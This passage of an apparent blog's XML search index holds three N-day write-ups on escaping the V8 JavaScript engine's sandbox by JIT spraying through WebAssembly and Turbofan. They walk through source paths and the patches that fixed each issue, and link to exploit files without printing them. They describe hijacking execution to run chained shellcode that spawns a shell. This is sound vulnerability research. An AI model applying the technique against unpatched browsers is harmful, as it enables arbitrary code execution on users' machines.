<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Escaping V8 Sandbox via JIT Spraying by WebAssembly: Part 1 (V8 &lt; 10.6.24)</title>
      <link href="/2024/01/27/Escaping-V8-Sandbox-via-JIT-Spraying-by-WebAssembly-Part-1/"/>
      <url>/2024/01/27/Escaping-V8-Sandbox-via-JIT-Spraying-by-WebAssembly-Part-1/</url>
      
        <content type="html"><![CDATA[<p>In this post, I will outline an exploit technique which allows us to escape the V8 sandbox via JIT spraying by WebAssembly. This leads us to arbitrary code execution starting from sandboxed exploit primitives.</p><h2 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h2><ul><li>Ubuntu 20.04 (WSL)</li><li><a href="https://github.com/v8/v8/commit/cb5c1b8a1fd1eee214501ee06fdd4566886803c1"><code>cb5c1b8a1fd1eee214501ee06fdd4566886803c1</code></a> (Jul 26, 2022)</li></ul><p>Run <a href="setup.py"><code>setup.py</code></a> in the working directory.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="WebAssembly-jump-table"><a href="#WebAssembly-jump-table" class="headerlink" title="WebAssembly jump table"></a>WebAssembly jump table</h3><p><img src="/2024/01/27/Escaping-V8-Sandbox-via-JIT-Spraying-by-WebAssembly-Part-1/1.png"></p><p><img src="/2024/01/27/Escaping-V8-Sandbox-via-JIT-Spraying-by-WebAssembly-Part-1/2.png"></p><p><img src="/2024/01/27/Escaping-V8-Sandbox-via-JIT-Spraying-by-WebAssembly-Part-1/3.png"></p><p><code>test.wat</code> defines two empty functions exported to JavaScript as <code>f1</code> and <code>f2</code>, respectively.</p><p><img src="/2024/01/27/Escaping-V8-Sandbox-via-JIT-Spraying-by-WebAssembly-Part-1/4.png"></p><p><img src="/2024/01/27/Escaping-V8-Sandbox-via-JIT-Spraying-by-WebAssembly-Part-1/5.png"></p><p><a href="https://developer.mozilla.org/docs/WebAssembly/Reference/JavaScript_interface/Module/Module"><code>WebAssembly.Module()</code></a> is managed by <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/wasm-js.cc#L707"><code>WebAssemblyModule()</code></a>. It copies the source of the module to <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/wasm-js.cc#L728"><code>bytes</code></a> and passes it to <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/wasm-js.cc#L745"><code>WasmEngine::SyncCompile()</code></a>.</p><p><img src="/2024/01/27/Escaping-V8-Sandbox-via-JIT-Spraying-by-WebAssembly-Part-1/6.png"></p><p><a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/wasm-engine.cc#L535"><code>WasmEngine::SyncCompile()</code></a> calls <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/wasm-engine.cc#L554"><code>CompileToNativeModule()</code></a> to compile <code>bytes</code> to a <code>NativeModule</code> object. <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/module-compiler.cc#L1931"><code>CompileToNativeModule()</code></a> gets into <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/module-compiler.cc#L1967"><code>WasmEngine::NewNativeModule()</code></a> → <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/wasm-engine.cc#L1167"><code>WasmCodeManager::NewNativeModule()</code></a>. <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/wasm-code-manager.cc#L2237"><code>WasmCodeManager::NewNativeModule()</code></a> calls <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/wasm-code-manager.cc#L2267"><code>WasmCodeManager::TryAllocate()</code></a> to allocate a <code>code_space</code> for the module.</p><p><img src="/2024/01/27/Escaping-V8-Sandbox-via-JIT-Spraying-by-WebAssembly-Part-1/7.png"></p><p>Then, <code>WasmCodeManager::NewNativeModule()</code> constructs a <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/wasm-code-manager.cc#L2286"><code>NativeModule</code></a> object with the <code>code_space</code>.</p><p><img src="/2024/01/27/Escaping-V8-Sandbox-via-JIT-Spraying-by-WebAssembly-Part-1/8.png"></p><p>At this point, the code space has no permission yet.</p><p><img src="/2024/01/27/Escaping-V8-Sandbox-via-JIT-Spraying-by-WebAssembly-Part-1/9.png"></p><p><a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/wasm-code-manager.cc#L972"><code>NativeModule::NativeModule()</code></a> calls <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/wasm-code-manager.cc#L1012"><code>NativeModule::AddCodeSpaceLocked()</code></a> to initialise the code space. In <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/wasm-code-manager.cc#L1577"><code>NativeModule::AddCodeSpaceLocked()</code></a>, <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/wasm-code-manager.cc#L1609"><code>needs_far_jump_table</code></a> is set to <code>true</code> if nothing has been created previously, and <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/wasm-code-manager.cc#L1611"><code>needs_jump_table</code></a> is set to <code>true</code> if <code>needs_far_jump_table</code> is <code>true</code> and the module contains at least one function.</p><p>Both <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/wasm-code-manager.cc#L1614"><code>jump_table</code></a> and <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/wasm-code-manager.cc#L1621"><code>far_jump_table</code></a> are created by <code>NativeModule::CreateEmptyJumpTableInRegionLocked()</code>. <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/wasm-code-manager.cc#L1484"><code>NativeModule::CreateEmptyJumpTableInRegionLocked()</code></a> calls <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/wasm-code-manager.cc#L1491"><code>WasmCodeAllocator::AllocateForCodeInRegion()</code></a> to reserve <code>jump_table_size</code> of <code>code_space</code>.</p><p><a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/wasm-code-manager.cc#L710"><code>WasmCodeAllocator::AllocateForCodeInRegion()</code></a> allocates <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/wasm-code-manager.cc#L715"><code>code_space</code></a> by <code>size</code> from the front of <code>free_code_space_</code>, and <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/wasm-code-manager.cc#L770">commits</a> the <code>code_space</code> in case there’s any region that has never been committed between <code>code_space.begin()</code> and <code>code_space.end()</code>. <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/wasm-code-manager.cc#L1908"><code>WasmCodeManager::Commit()</code></a> calls <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/wasm-code-manager.cc#L1958"><code>SetPermissions()</code></a> to set the permission of the <code>region</code> to <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/wasm-code-manager.cc#L1945"><code>PageAllocator::kReadWriteExecute</code></a> for compiling and executing the Wasm code.</p><p><img src="/2024/01/27/Escaping-V8-Sandbox-via-JIT-Spraying-by-WebAssembly-Part-1/10.png"></p><p>While the jump table remains empty after it’s created, the far jump table is generated first by <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/wasm-code-manager.cc#L1640"><code>JumpTableAssembler::GenerateFarJumpTable()</code></a>. Each slot in the far jump table contains a <code>jmp</code> instruction pointing to each <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/jump-table-assembler.h#L143"><code>target</code></a> in <code>stub_targets</code> and the module.</p><p><img src="/2024/01/27/Escaping-V8-Sandbox-via-JIT-Spraying-by-WebAssembly-Part-1/11.png"></p><p>After <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/module-compiler.cc#L1967"><code>WasmEngine::NewNativeModule()</code></a> is returned and <code>native_module</code> is ready to be compiled, <code>CompileToNativeModule()</code> calls <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/module-compiler.cc#L1973"><code>CompileNativeModule()</code></a>. <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/module-compiler.cc#L1834"><code>CompileNativeModule()</code></a> gets into</p><p><a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/module-compiler.cc#L1870"><code>CompilationStateImpl::WaitForCompilationEvent()</code></a><br>→ <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/module-compiler.cc#L3789"><code>ExecuteCompilationUnits()</code></a><br>→ <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/module-compiler.cc#L1626"><code>CompilationStateImpl::SchedulePublishCompilationResults()</code></a><br>→ <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/module-compiler.cc#L3703"><code>CompilationStateImpl::PublishCompilationResults()</code></a><br>→ <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/module-compiler.cc#L3671"><code>CompilationStateImpl::PublishCode()</code></a><br>→ <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/module-compiler.cc#L3678"><code>NativeModule::PublishCode()</code></a>.</p><p><a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/wasm-code-manager.cc#L1286"><code>NativeModule::PublishCode()</code></a> calls <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/wasm-code-manager.cc#L1298"><code>NativeModule::PublishCodeLocked()</code></a> for each <code>code</code> corresponding to each function in the module, and <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/wasm-code-manager.cc#L1314"><code>NativeModule::PublishCodeLocked()</code></a> calls <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/wasm-code-manager.cc#L1371"><code>NativeModule::PatchJumpTablesLocked()</code></a> → <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/wasm-code-manager.cc#L1530"><code>NativeModule::PatchJumpTableLocked()</code></a> → <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/wasm-code-manager.cc#L1573"><code>JumpTableAssembler::PatchJumpTableSlot()</code></a> to generate the jump table slot which contains a <code>jmp</code> instruction pointing to the starting address of compiled instructions of the function.</p><p><img src="/2024/01/27/Escaping-V8-Sandbox-via-JIT-Spraying-by-WebAssembly-Part-1/12.png"></p><h3 id="Execution-flow-of-WebAssembly-function"><a href="#Execution-flow-of-WebAssembly-function" class="headerlink" title="Execution flow of WebAssembly function"></a>Execution flow of WebAssembly function</h3><p><img src="/2024/01/27/Escaping-V8-Sandbox-via-JIT-Spraying-by-WebAssembly-Part-1/13.png"></p><p><img src="/2024/01/27/Escaping-V8-Sandbox-via-JIT-Spraying-by-WebAssembly-Part-1/14.png"></p><p>When a Wasm function is called, the handler gets <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/objects/js-function.tq#L33"><code>shared_function_info</code></a> from <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/objects/js-function.tq#L32"><code>JSFunction</code></a>,</p><p><img src="/2024/01/27/Escaping-V8-Sandbox-via-JIT-Spraying-by-WebAssembly-Part-1/15.png"></p><p>gets <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/objects/shared-function-info.tq#L55"><code>function_data</code></a> from <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/objects/shared-function-info.tq#L50"><code>SharedFunctionInfo</code></a>,</p><p><img src="/2024/01/27/Escaping-V8-Sandbox-via-JIT-Spraying-by-WebAssembly-Part-1/16.png"></p><p><img src="/2024/01/27/Escaping-V8-Sandbox-via-JIT-Spraying-by-WebAssembly-Part-1/17.png"></p><p>gets <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/wasm-objects.tq#L51"><code>internal</code></a> from <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/wasm-objects.tq#L57"><code>WasmExportedFunctionData</code></a>,</p><p><img src="/2024/01/27/Escaping-V8-Sandbox-via-JIT-Spraying-by-WebAssembly-Part-1/18.png"></p><p>and finally, gets <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/objects/foreign.tq#L7"><code>foreign_address</code></a> named call target from <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/wasm-objects.tq#L34"><code>WasmInternalFunction</code></a>. </p><p><img src="/2024/01/27/Escaping-V8-Sandbox-via-JIT-Spraying-by-WebAssembly-Part-1/19.png"></p><p>The call target is the address of the jump table slot corresponding to the function called.</p><p>With sandboxed exploit primitives, we can get the address of the <code>WasmInternalFunction</code> object and overwrite the call target with an arbitrary address to hijack the execution flow.</p><h3 id="Compiling-i64-const"><a href="#Compiling-i64-const" class="headerlink" title="Compiling i64.const"></a>Compiling i64.const</h3><p><code>Builtins_WasmCompileLazy()</code> gets into</p><p><code>Builtins_WasmCEntry()</code><br>→ <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/runtime/runtime-wasm.cc#L221"><code>Runtime_WasmCompileLazy()</code></a><br>→ <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/runtime/runtime-wasm.cc#L244"><code>CompileLazy()</code></a><br>→ <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/module-compiler.cc#L1174"><code>WasmCompilationUnit::ExecuteCompilation()</code></a></p><p>to compile a Wasm module. <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/function-compiler.cc#L32"><code>WasmCompilationUnit::ExecuteCompilation()</code></a> calls <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/function-compiler.cc#L40"><code>WasmCompilationUnit::ExecuteFunctionCompilation()</code></a> for each function in the module. <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/function-compiler.cc#L69"><code>WasmCompilationUnit::ExecuteFunctionCompilation()</code></a> calls <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/function-compiler.cc#L121"><code>ExecuteLiftoffCompilation()</code></a> to use <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/function-compiler.cc#L105">Liftoff</a>, which is a baseline compiler for WebAssembly, for lazy compilation on the first call. <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/baseline/liftoff-compiler.cc#L7577"><code>ExecuteLiftoffCompilation()</code></a> constructs a <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/baseline/liftoff-compiler.cc#L7601"><code>WasmFullDecoder</code></a> object and calls <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/baseline/liftoff-compiler.cc#L7609"><code>WasmFullDecoder::Decode()</code></a> → <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/function-body-decoder-impl.h#L2494"><code>WasmFullDecoder::DecodeFunctionBody()</code></a> to decode the function body. <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/function-body-decoder-impl.h#L2626"><code>WasmFullDecoder::DecodeFunctionBody()</code></a> calls the <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/function-body-decoder-impl.h#L2678"><code>handler</code></a> for each <code>opcode</code> in the function body.</p><p><code>i64.const</code> is handled by <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/function-body-decoder-impl.h#L3344"><code>WasmFullDecoder::DecodeI64Const()</code></a>. It gets into</p><p><a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/function-body-decoder-impl.h#L3347"><code>LiftoffCompiler::I64Const()</code></a><br>→ <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/baseline/liftoff-compiler.cc#L2205"><code>LiftoffAssembler::LoadConstant()</code></a><br>→ <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/baseline/x64/liftoff-assembler-x64.h#L319"><code>TurboAssembler::Move()</code></a><br>→ <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/codegen/x64/macro-assembler-x64.h#L302"><code>Assembler::movq()</code></a><br>→ <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/codegen/x64/assembler-x64.h#L529"><code>Assembler::emit_mov()</code></a></p><p>and eventually assembles an instruction which moves the constant <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/codegen/x64/assembler-x64.cc#L1684"><code>value</code></a> to an unused register.</p><p><img src="/2024/01/27/Escaping-V8-Sandbox-via-JIT-Spraying-by-WebAssembly-Part-1/20.png"></p><p><img src="/2024/01/27/Escaping-V8-Sandbox-via-JIT-Spraying-by-WebAssembly-Part-1/21.png"></p><p>Assembled instructions are <a href="https://github.com/v8/v8/blob/cb5c1b8a1fd1eee214501ee06fdd4566886803c1/src/wasm/wasm-code-manager.cc#L1230">copied</a> to the Wasm code space when the module is compiled. In conclusion, we can insert arbitrary 8-byte constant numbers, which can be potentially used for <a href="https://en.wikipedia.org/wiki/JIT_spraying">JIT spraying</a>, into the assembly code of the function.</p><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="Spray-shellcode"><a href="#Spray-shellcode" class="headerlink" title="Spray shellcode"></a>Spray shellcode</h3><p>We can execute up to 8-byte shellcode by inserting it into the assembly code of the Wasm function and moving <code>rip</code> to where the shellcode lies by overwriting the call target of the <code>WasmInternalFunction</code> object corresponding to the function.</p><p>However, it’d be impossible to do what we want to, for example, <code>execve(&quot;/bin/sh&quot;, 0, 0)</code>, with only 8 bytes of assembly code. Therefore, we must chain several shellcode segments using a relative <a href="https://www.felixcloutier.com/x86/jmp"><code>jmp</code></a> instruction. The distances between the floating-point numbers in the code are consistent, so we can make each segment jump to the next one by constructing each one with a 6-byte shellcode and a 2-byte <code>jmp</code> instruction.</p><p><a href="shellcode.py"><code>shellcode.py</code></a></p><h3 id="Hijack-execution-flow"><a href="#Hijack-execution-flow" class="headerlink" title="Hijack execution flow"></a>Hijack execution flow</h3><p><a href="pwn.wat"><code>pwn.wat</code></a> <a href="pwn.js"><code>pwn.js</code></a></p><p><img src="/2024/01/27/Escaping-V8-Sandbox-via-JIT-Spraying-by-WebAssembly-Part-1/pwn.png"></p><h2 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h2><blockquote><p><a href="https://github.com/v8/v8/commit/2eb73988a37a60520a0f8e0b1109edbcc0b91415">[sandbox] Refactor and sandboxify WasmInternalFunction::call_target</a> (Jul 26, 2022)</p><p>This CL refactors WasmInternalFunction to no longer inherit from Foreign but instead contain a (sandboxed) ExternalPointer field for the call target.</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> N-day </category>
          
      </categories>
      
      
        <tags>
            
            <tag> chromium </tag>
            
            <tag> v8 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Escaping V8 Sandbox via JIT Spraying by Turbofan: Part 2 (10.0.52 &lt;= V8 &lt; 11.7.154)</title>
      <link href="/2023/07/30/Escaping-V8-Sandbox-via-JIT-Spraying-by-Turbofan-Part-2/"/>
      <url>/2023/07/30/Escaping-V8-Sandbox-via-JIT-Spraying-by-Turbofan-Part-2/</url>
      
        <content type="html"><![CDATA[<p>Because the external code space is enabled in the <a href="https://github.com/v8/v8/commit/5351e0e805e6e7081250b5b9a015dcff8157d1dc">patch</a> for <a href="/2023/07/29/Escaping-V8-Sandbox-via-JIT-Spraying-by-Turbofan-Part-1/" title="Escaping V8 Sandbox via JIT Spraying by Turbofan: Part 1 (V8 &lt; 10.0.52)">part 1</a>, the execution flow of the Turbofan-compiled function is slightly altered. Still, it’s possible to hijack the execution flow to execute arbitrary code if we have sandboxed exploit primitives.</p><h2 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h2><ul><li>Ubuntu 20.04 (WSL)</li><li><a href="https://github.com/v8/v8/commit/4512c6eb7189c21f39420ddf8d9ff4f05a4a39b4"><code>4512c6eb7189c21f39420ddf8d9ff4f05a4a39b4</code></a> (Jul 11, 2023)</li></ul><p>Run <a href="setup.py"><code>setup.py</code></a> in the working directory.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Execution-flow-of-Turbofan-compiled-function"><a href="#Execution-flow-of-Turbofan-compiled-function" class="headerlink" title="Execution flow of Turbofan-compiled function"></a>Execution flow of Turbofan-compiled function</h3><p><a href="https://github.com/v8/v8/blob/4512c6eb7189c21f39420ddf8d9ff4f05a4a39b4/src/objects/js-function.tq#L32"><code>JSFunction</code></a> has an accessor named <a href="https://github.com/v8/v8/blob/4512c6eb7189c21f39420ddf8d9ff4f05a4a39b4/src/objects/js-function.tq#L36"><code>code</code></a>, which points to a <a href="https://github.com/v8/v8/blob/4512c6eb7189c21f39420ddf8d9ff4f05a4a39b4/src/objects/code.h#L50"><code>Code</code></a> object. The <code>Code</code> has a pointer named <a href="https://github.com/v8/v8/blob/4512c6eb7189c21f39420ddf8d9ff4f05a4a39b4/src/objects/code.h#L78"><code>instruction_start</code></a>, which points to the address where the function’s instructions begin.</p><p><img src="/2023/07/30/Escaping-V8-Sandbox-via-JIT-Spraying-by-Turbofan-Part-2/1.png"></p><p><img src="/2023/07/30/Escaping-V8-Sandbox-via-JIT-Spraying-by-Turbofan-Part-2/2.png"></p><p>When the compiled function is called, the function call handler gets the <code>instruction_start</code> pointer and jumps to that address.</p><p><img src="/2023/07/30/Escaping-V8-Sandbox-via-JIT-Spraying-by-Turbofan-Part-2/3.png"></p><p><img src="/2023/07/30/Escaping-V8-Sandbox-via-JIT-Spraying-by-Turbofan-Part-2/4.png"></p><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="Hijack-execution-flow"><a href="#Hijack-execution-flow" class="headerlink" title="Hijack execution flow"></a>Hijack execution flow</h3><p>The <code>Code</code> object is inside the V8 sandbox, so we can overwrite the <code>instruction_start</code> field with an arbitrary address which we want <code>rip</code> to jump to, using the sandboxed exploit primitives.</p><p><a href="shellcode.py"><code>shellcode.py</code></a> <a href="pwn.js"><code>pwn.js</code></a></p><p><img src="/2023/07/30/Escaping-V8-Sandbox-via-JIT-Spraying-by-Turbofan-Part-2/pwn.png"></p><h2 id="Bisection"><a href="#Bisection" class="headerlink" title="Bisection"></a>Bisection</h2><blockquote><p><a href="https://github.com/v8/v8/commit/fd608d18b59eaaafa8928fe49fc7624f31bcccfa">[ext-code-space] Enable external code space on x64 and desktop arm64</a> (Jan 26, 2022)</p><p><a href="https://github.com/v8/v8/commit/aefa66da282145f1195759efc15a00964da2b9dd">Revert “[ext-code-space] Enable external code space on x64 and desktop arm64”</a> (Jan 26, 2022)</p><p><a href="https://github.com/v8/v8/commit/e7ffb2570ce4ac8c0a1b9a1dfd0b3fcb3227bba9">[ext-code-space] Enable external code space on x64 and desktop arm64</a> (Jan 27, 2022)</p><p><a href="https://github.com/v8/v8/commit/f9ae535aca6d92830ffa7a9bf83ddeeab4602d78">Revert “[ext-code-space] Enable external code space on x64 and desktop arm64”</a> (Jan 28, 2022)</p><p><a href="https://github.com/v8/v8/commit/5351e0e805e6e7081250b5b9a015dcff8157d1dc">[ext-code-space] Enable external code space on x64 and desktop arm64</a> (Jan 28, 2022)</p></blockquote><h2 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h2><blockquote><p><a href="https://github.com/v8/v8/commit/c8d039b05081b474ef751411a5c76ca01900e49a">[sandbox] Enable code pointer sandboxing</a> (Jul 11, 2023)</p><p><a href="https://github.com/v8/v8/commit/bc795ebd90a5a7c957b644da5fac369eb88aa87a">Revert “[sandbox] Enable code pointer sandboxing”</a> (Jul 11, 2023)</p><p><a href="https://github.com/v8/v8/commit/7df23d5163a10a12e4b4262dd4e78cfb7ec97be0">Reland “[sandbox] Enable code pointer sandboxing”</a> (Jul 11, 2023)</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> N-day </category>
          
      </categories>
      
      
        <tags>
            
            <tag> chromium </tag>
            
            <tag> v8 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Escaping V8 Sandbox via JIT Spraying by Turbofan: Part 1 (V8 &lt; 10.0.52)</title>
      <link href="/2023/07/29/Escaping-V8-Sandbox-via-JIT-Spraying-by-Turbofan-Part-1/"/>
      <url>/2023/07/29/Escaping-V8-Sandbox-via-JIT-Spraying-by-Turbofan-Part-1/</url>
      
        <content type="html"><![CDATA[<p>In this post, I will outline an exploit technique that enables us to escape the V8 sandbox via JIT spraying by Turbofan. This leads us to arbitrary code execution starting from sandboxed exploit primitives.</p><h2 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h2><ul><li>Ubuntu 20.04 (WSL)</li><li><a href="https://github.com/v8/v8/commit/17f686b1b7a6550b3a6e20a4f4455c39f6cebd05"><code>17f686b1b7a6550b3a6e20a4f4455c39f6cebd05</code></a> (Jan 28, 2022)</li></ul><p>Place <a href="sandbox.diff"><code>sandbox.diff</code></a> and <a href="setup.py"><code>setup.py</code></a> in the working directory and run <code>setup.py</code>.</p><p><code>sandbox.diff</code> is identical to <a href="https://github.com/v8/v8/commit/4a12cb1022ba335ce087dcfe31b261355524b3bf">this commit</a>, which introduced a memory corruption API that enables us to implement exploit primitives working inside the V8 sandbox.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Execution-flow-of-Turbofan-compiled-function"><a href="#Execution-flow-of-Turbofan-compiled-function" class="headerlink" title="Execution flow of Turbofan-compiled function"></a>Execution flow of Turbofan-compiled function</h3><p>Function in JavaScript is managed by the <a href="https://github.com/v8/v8/blob/17f686b1b7a6550b3a6e20a4f4455c39f6cebd05/src/objects/js-function.tq#L23"><code>JSFunction</code></a> class. It has an accessor named <a href="https://github.com/v8/v8/blob/17f686b1b7a6550b3a6e20a4f4455c39f6cebd05/src/objects/js-function.tq#L28"><code>code</code></a> which points to a <a href="https://github.com/v8/v8/blob/17f686b1b7a6550b3a6e20a4f4455c39f6cebd05/src/objects/code.h#L215"><code>Code</code></a> object.</p><p><img src="/2023/07/29/Escaping-V8-Sandbox-via-JIT-Spraying-by-Turbofan-Part-1/1.png"></p><p><img src="/2023/07/29/Escaping-V8-Sandbox-via-JIT-Spraying-by-Turbofan-Part-1/2.png"></p><p><img src="/2023/07/29/Escaping-V8-Sandbox-via-JIT-Spraying-by-Turbofan-Part-1/3.png"></p><p><img src="/2023/07/29/Escaping-V8-Sandbox-via-JIT-Spraying-by-Turbofan-Part-1/4.png"></p><p>We can follow the execution flow by setting a read watchpoint on the <code>code</code> field of the function.</p><p><img src="/2023/07/29/Escaping-V8-Sandbox-via-JIT-Spraying-by-Turbofan-Part-1/5.png"></p><p><img src="/2023/07/29/Escaping-V8-Sandbox-via-JIT-Spraying-by-Turbofan-Part-1/6.png"></p><p><img src="/2023/07/29/Escaping-V8-Sandbox-via-JIT-Spraying-by-Turbofan-Part-1/7.png"></p><p>At this point, <code>rcx</code> holds the address of the <code>Code</code> object. The value at <code>rcx + 0x1b</code> indicates the <a href="https://github.com/v8/v8/blob/17f686b1b7a6550b3a6e20a4f4455c39f6cebd05/src/objects/code.h#L630">flags</a> of the function. The code above checks if <a 